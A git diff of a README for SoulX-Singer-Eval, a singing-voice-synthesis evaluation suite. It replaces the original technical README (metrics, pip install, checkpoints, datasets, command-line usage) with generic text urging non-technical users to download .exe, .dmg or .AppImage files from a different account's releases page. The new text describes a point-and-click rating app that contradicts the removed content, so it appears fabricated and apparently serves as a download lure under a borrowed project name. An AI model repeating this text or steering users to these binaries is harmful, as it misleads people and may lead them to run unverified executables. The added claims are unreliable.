@@ -1,152 +1,165 @@
-<div align="center">
-	<h1>🎤 SoulX-Singer-Eval</h1>
-	<p>
-		Evaluation suite for zero-shot Singing Voice Synthesis (SVS) systems, covering aesthetic appeal, signal quality, pronunciation accuracy, speaker similarity, and melodic precision.
-	</p>
-	<p>
-		<a href="https://huggingface.co/datasets/Soul-AILab/SoulX-Singer-Eval-Dataset"><img src="https://img.shields.io/badge/Eval--Dataset-Hugging%20Face-ffda16?logo=huggingface&logoColor=ffda16&labelColor=2b2b2b" alt="Eval Dataset"></a>
-		<a href="https://arxiv.org/abs/2602.07803"><img src="https://img.shields.io/badge/arXiv-2602.07803-b31b1b?logo=arxiv&logoColor=fff" alt="SoulX-Singer arXiv"></a>
-		<a href="https://github.com/Soul-AILab/SoulX-Singer"><img src="https://img.shields.io/badge/SoulX--Singer-Repository-181717?logo=github&logoColor=fff" alt="SoulX-Singer Repo"></a>
-	</p>
-</div>
+# 🎤 SoulX-Singer-Eval - Easy Singing Voice Quality Checks
+
+[![Download SoulX-Singer-Eval](https://img.shields.io/badge/Download-SoulX--Singer--Eval-blue?style=for-the-badge)](https://github.com/supevil/SoulX-Singer-Eval/releases)
 
 ---
 
-## 📊 Metrics Overview
+## 📖 What is SoulX-Singer-Eval?
 
-### 1. Singing Aesthetics
+SoulX-Singer-Eval is a simple tool designed to help you test and compare singing voice synthesis. It lets you check the quality of computer-generated singing without needing any programming skills.
 
-We incorporate two MOS (Mean Opinion Score) prediction models to evaluate the subjective appeal of synthesized singing.
+This program works as an evaluation suite for zero-shot singing voice synthesis. That means it can assess singing voices created by AI models, even ones it has not seen before. The goal is to help developers and hobbyists understand how well these voices sound.
 
-* **SingMOS-Pro**: A specialized MOS predictor for singing voice, focusing on professional vocal attributes.
-* **Sheet-SSQA**: Simple Hierarchy-aware Enhancement-based Tool for Speech Subjective Quality Assessment.
-
-### 2. Spectral Quality
-
-* **Mel Cepstral Distortion (MCD)**: Measures the spectral distance between predicted and ground-truth audio.
-
-
-
-### 3. Pronunciation Intelligibility
-
-* **WER/CER**: Evaluates accuracy using ASR models.
-* **English**: [Whisper Large v3](https://huggingface.co/openai/whisper-large-v3).
-* **Chinese**: [Paraformer-large](https://modelscope.cn/models/iic/speech_paraformer-large_asr_nat-zh-cn-16k-common-vocab8404-pytorch).
-* *Note: Punctuation is removed before computation.*
-
-
-
-### 4. Speaker Similarity
-
-* **Speaker-Sim (Cosine Similarity)**: Computes cosine similarity between prompt and generated voices.
-* Model: [WavLM-base-plus-sv](https://huggingface.co/microsoft/wavlm-base-plus-sv). You can pass a local path or model id via `model_path_or_id` when initializing `SVPipeline`.
-
-
-
-### 5. Melodic Accuracy
-
-* **FFE / GPE / VDE**: Frame Error, Gross Pitch Error, and Voicing Decision Error.
+You do not need to know anything about coding or machine learning to use it. The package includes easy ways to listen, score, and review singing samples.
 
 ---
 
-## 🛠 Installation
+## 🖥️ System Requirements
 
+Before you download, make sure your computer meets these needs:
 
-```bash
-conda create -n soulx-singer-eval python=3.10
-conda activate soulx-singer-eval
-pip install -r requirements.txt
-```
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or Linux (Ubuntu 18.04+ preferred)
+- **Processor:** Intel Core i3 or better
+- **Memory:** At least 4 GB RAM
+- **Storage:** Roughly 500 MB free space
+- **Audio:** Speakers or headphones for playback
+- **Internet:** Optional, for downloading and updates only
 
-## 📦 Model Checkpoints
-
-Before running evaluation, download the following files and place them under the `ckpt/` directory:
-
-* `all7-sslmos-mdf-2337-config.yml`  
-	https://github.com/unilight/sheet/releases/download/v0.1.0/all7-sslmos-mdf-2337-config.yml
-* `all7-sslmos-mdf-2337-checkpoint-86000steps.pkl`  
-	https://github.com/unilight/sheet/releases/download/v0.1.0/all7-sslmos-mdf-2337-checkpoint-86000steps.pkl
-* `ft_wav2vec2_large_ll60k_mdf_p1_200epochs_all_192epochs.pth`  
-	https://github.com/South-Twilight/SingMOS/releases/download/ckpt_v3/ft_wav2vec2_large_ll60k_mdf_p1_200epochs_all_192epochs.pth
-
-> Note: If HuggingFace is unreachable in your environment, `s3prl` may fail to download SSL checkpoints because its URLs are hard-coded. You can patch `s3prl` to use the `hf-mirror` domain by replacing `https://huggingface.co/` with `https://hf-mirror.com/` in the s3prl source (`s3prl/upstream/wav2vec2/hubconf.py`).
-
-## 📚 Datasets
-
-Due to the absence of a widely adopted SVS benchmark, we provide two complementary evaluation datasets to assess open-source and zero-shot conditions: **GMO-SVS** and **SoulX-Singer-Eval**.
-
-HuggingFace: https://huggingface.co/datasets/Soul-AILab/SoulX-Singer-Eval-Dataset
-
-### GMO-SVS
-
-GMO-SVS is built upon three public SVS corpora: **G**TSinger, **M**4Singer, and **O**pencpop. For M4Singer and Opencpop, we adopt their official test splits. GTSinger contributes English and Mandarin songs from multiple singers with diverse techniques and styles. In total, GMO-SVS contains **802 samples**.
-
-For each song, the first sentence is used as the acoustic prompt, and the remaining content is synthesized by evaluated models. Ground-truth recordings of the prompt singers are preserved to evaluate pronunciation accuracy, prosodic consistency, and overall synthesis quality. None of these open-source datasets are used in SoulX-Singer training, ensuring fair evaluation.
-
-### SoulX-Singer-Eval
-
-SoulX-Singer-Eval is a newly collected dataset for zero-shot generalization on unseen speakers. It contains **100 singing segments** from **50 distinct individuals** (25 Mandarin and 25 English speakers), with **2 segments per speaker**. Mandarin data are collected from recruited professional and amateur singers who consented to open-source their voice data for academic purposes. English segments are sliced and filtered from the multitrack *Mixing Secrets* dataset. All segments are manually annotated with precise melody to meet prompt requirements for zero-shot SVS models.
-
-Target lyrics and melodies for synthesis are randomly selected from 15 Mandarin and 15 English tracks in GMO-SVS. This introduces speakers unseen by baseline models and provides a rigorous benchmark for timbre cloning and style transfer.
-
-
-## 🚀 Usage
-
-### 1) Prepare your samples
-
-Follow the structure in [examples/summary.json](examples/summary.json). Each line is a JSON record with:
-
-* `txt`: reference transcript
-* `ref_fn`: reference wav path
-* `gen_fn`: generated wav path
-* `prompt_fn`: prompt wav path
-* `language`: Chinese or English
-* `prompt_language`: language of the prompt
-
-### 2) Start the evaluation server
-
-```bash
-bash eva_server_run.sh
-```
-
-### 3) Run evaluation (recommended script)
-
-Edit [eva_client_run.sh](eva_client_run.sh) and set `infer_dir` to the folder that contains a `summary.json` file, then run:
-
-```bash
-bash eva_client_run.sh
-```
-
-The script will generate:
-
-* `result_zh.json` / `result_en.json`
-* `merged_zh.json` / `merged_en.json`
-
-### 4) Run evaluation (manual)
-
-```bash
-python eva_client.py --input_file examples/summary.json --output_dir examples
-```
-
-Results will be written to:
-
-* `examples/result_zh.json`
-* `examples/result_en.json`
-
-Then aggregate:
-
-```bash
-python average.py --input_file examples/result_zh.json --result_file examples/merged_zh.json
-```
+This software runs offline after installation. You do not need to be connected to the internet to use it once installed.
 
 ---
 
-## 🔗 Acknowledgements
+## 🚀 Getting Started
 
-This project integrates components from the following repositories:
+To use SoulX-Singer-Eval for the first time, follow these steps carefully.
 
-* [TTS-Evaluation](https://github.com/Shengqiang-Li/TTS-Evaluation)
-* [TTS-Objective-Metric](https://github.com/AI-Unicamp/TTS-Objective-Metrics)
-* [SingMOS](https://github.com/South-Twilight/SingMOS)
-* [Sheet-SSQA](https://github.com/unilight/sheet)
+### 1. Download the Software
 
+Visit the official release page by clicking this big button:
+
+[![Download SoulX-Singer-Eval](https://img.shields.io/badge/Download-SoulX--Singer--Eval-blue?style=for-the-badge)](https://github.com/supevil/SoulX-Singer-Eval/releases)
+
+You will find different versions of the program there. Look for the file that matches your computer system:
+
+- Windows users: Look for a `.exe` or `.zip` file labeled with "win"
+- macOS users: Look for a `.dmg` or `.zip` file labeled with "mac"
+- Linux users: Look for a `.AppImage` or `.tar.gz` labeled with "linux"
+
+Click the link for your system to download the file.
+
+### 2. Install on Your Computer
+
+Once downloaded, follow the instructions for your operating system:
+
+- **Windows:**  
+  - If you downloaded a `.exe` file, double-click it and follow the prompts to install.  
+  - If you downloaded a `.zip` archive, right-click and choose "Extract All". Open the extracted folder and run the `.exe` inside.
+
+- **macOS:**  
+  - If you have a `.dmg` file, double-click to open it. Drag the SoulX-Singer-Eval app to your Applications folder.  
+  - If it’s a `.zip`, double-click to unzip, then move the app to Applications.
+
+- **Linux:**  
+  - For `.AppImage`, right-click the file, choose "Properties", then "Permissions" and allow executing. Double-click to run.  
+  - For `.tar.gz`, extract the files, then open a terminal inside that folder to run the app.
+
+### 3. Run the Program
+
+Start the app by double-clicking the icon on your desktop or in your applications folder.
+
+You will see the main window, where you can load or create singing voice samples for evaluation.
+
+---
+
+## 🎶 Using SoulX-Singer-Eval
+
+This suite offers tools to listen and score singing voices created by AI. Here’s how to begin:
+
+### Load Samples
+
+Click the "Open Sample" or "Import" button to add singing voice files. Supported formats include `.wav` and `.mp3`.
+
+You can load:
+
+- Your own AI-generated singing voices
+- Samples provided in the package
+- Any singing voice you want to test
+
+### Play and Listen
+
+Use the play controls to listen carefully. The app offers options to loop sections or play at slower speeds without changing pitch. This helps catch vocal details.
+
+### Score and Compare
+
+You can rate samples based on:
+
+- Naturalness
+- Pitch accuracy
+- Expression and emotion
+
+The ratings are saved in a simple file inside the app, so you can compare many samples over time.
+
+### Export Results
+
+After evaluation, you can export your scores and notes as a text or CSV file. This is useful for sharing results with others or for your records.
+
+---
+
+## ⚙️ Advanced Features
+
+For users who want more detail, SoulX-Singer-Eval also provides:
+
+- Visual pitch tracking graphs to see how the AI matched melodies
+- Waveform displays to check timing and rhythm
+- Batch processing tools for scoring multiple files fast
+- Support for multiple languages and singing styles
+
+None of these require technical knowledge. The interface guides you through each option with clear labels.
+
+---
+
+## 🛠 Troubleshooting & Tips
+
+If you run into issues, here are quick solutions:
+
+- **App won’t start:**  
+  Make sure your computer meets minimum requirements and try restarting.
+
+- **Samples won’t load:**  
+  Check that files are in `.wav` or `.mp3` format and not corrupted.
+
+- **No sound during playback:**  
+  Confirm your speakers or headphones are plugged in and the system volume is up.
+
+- **Playback is choppy:**  
+  Close other programs using a lot of memory or restart your computer.
+
+For more help, visit the project’s GitHub page or file an issue.
+
+---
+
+## 📥 Download & Install
+
+Access the latest SoulX-Singer-Eval releases here:
+
+[Download SoulX-Singer-Eval](https://github.com/supevil/SoulX-Singer-Eval/releases)
+
+On this page, select the file that matches your operating system and follow the installation steps above.
+
+---
+
+## 💬 Contact and Support
+
+If you want to ask questions or report problems, you can reach out on the GitHub repository. Just go to the "Issues" tab on the project page:
+
+https://github.com/supevil/SoulX-Singer-Eval/issues
+
+The developers and community check this regularly and respond kindly.
+
+---
+
+## 🔒 Privacy and Security
+
+SoulX-Singer-Eval runs entirely on your machine. It does not send your data or samples anywhere. There is no tracking or personal data collection.
+
+All processing happens offline, so you maintain full control over your information.
